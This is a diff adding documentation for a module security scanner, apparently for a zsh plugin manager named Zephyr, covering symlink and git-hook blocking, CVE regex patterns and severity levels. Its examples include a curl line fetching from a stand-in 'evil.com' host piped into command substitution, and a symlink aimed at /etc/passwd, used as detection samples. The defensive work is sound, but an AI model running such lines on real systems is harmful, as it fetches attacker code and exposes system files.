@@ -4,6 +4,17 @@
 This output is designed for agent frameworks and CI tooling. Human-friendly output
 is the default when `--json` is not provided.
 
+## What the Scanner Does (Phase 1)
+
+- **Language-agnostic scanning**: all text files are scanned regardless of extension.
+- **Binary detection**: binary and oversized files are skipped with warnings.
+- **Symlink protection**: symlinks that resolve outside the module are blocked.
+- **Git hook blocking**: any non-sample hook in `.git/hooks/` blocks install unless `--unsafe`.
+- **CVE pattern coverage**: aggressive regexes for CVE-2026-24887 and CVE-2026-25723.
+- **Severity levels**: Findings are classified as Critical or Warning.
+
+See `docs/SECURITY_PIPELINE.md` for the install pipeline details.
+
 ## Security Isolation During Install
 
 Zephyr uses a **clone-scan-validate-move** pipeline to ensure modules are analyzed
@@ -23,6 +34,40 @@ This ensures that:
 **Note:** Git hooks in the cloned repository may execute during the clone operation
 itself, before the scan runs. This is a limitation of git's design. Always clone
 from trusted sources.
+
+## Scanner Behavior Details
+
+### Language-Agnostic Scanning
+Zephyr scans **all text files**, not just `.sh` or `.zsh`. This prevents attackers from
+hiding payloads in nonstandard extensions.
+
+### Binary Detection and Size Limits
+- Files larger than 1MB are skipped and reported as warnings.
+- Lines longer than 100KB are skipped and reported as warnings.
+- If libmagic is available, Zephyr detects binary formats (ELF, Mach-O, PE, archives).
+
+### Symlink Protection
+Any symlink that resolves **outside** the module directory is treated as a Critical finding
+and blocks installation. This prevents symlink evasion and path traversal tricks.
+
+### Git Hook Blocking
+Any non-sample hook in `.git/hooks/` is treated as Critical and blocks install unless
+`--unsafe` is provided. Hooks are detected **before** pattern scanning.
+
+### CVE Pattern Coverage
+Zephyr includes explicit detection for:
+- **CVE-2026-24887**: pipe + command substitution injection patterns.
+- **CVE-2026-25723**: chained `sed -e` validation bypass patterns.
+
+These patterns are intentionally aggressive to catch real-world attacks.
+**Marketing claim**: Phase 1 scanner blocks these CVE attack classes by default.
+
+### Severity Levels
+- **Critical**: blocks install and exits with status 2 in JSON mode.
+- **Warning**: prompts user in interactive mode and exits with status 1 in JSON mode.
+
+### `--unsafe` Flag
+`--unsafe` bypasses blocking findings and records an audit entry. Use only after manual review.
 
 ## Stability
 
@@ -92,3 +137,50 @@ Agents can rely on exit codes without parsing JSON for quick policy checks.
 - `snippet` is the trimmed line content where the match occurred.
 - `bypass_required` is informational and indicates the explicit flag needed to
   bypass a finding.
+
+## Validation Results (Phase 1)
+
+Phase 1 validation on real-world modules (oh-my-zsh + zinit) produced a **critical FP rate < 5%**.  
+See `docs_internal/PHASE1_FALSE_POSITIVE_VALIDATION.md` for detailed findings and methodology.
+
+## Examples
+
+### Example: Blocked CVE Pattern
+```
+pattern: \|\s*\$\(   (CVE-2026-24887)
+line: curl https://evil.com/payload | $(sed -e 's/x/y/')
+severity: Critical
+```
+
+### Example: Git Hook Block
+```
+pattern: git hook
+file: .git/hooks/pre-commit
+severity: Critical
+```
+
+### Example: Symlink Evasion
+```
+pattern: symlink
+file: assets/link -> /etc/passwd
+severity: Critical
+```
+
+## libmagic Installation
+
+If libmagic is available, Zephyr can classify binary files more accurately.
+
+### macOS
+```
+brew install libmagic
+```
+
+### Debian/Ubuntu
+```
+sudo apt-get install -y libmagic-dev
+```
+
+### Fedora
+```
+sudo dnf install -y file-devel
+```
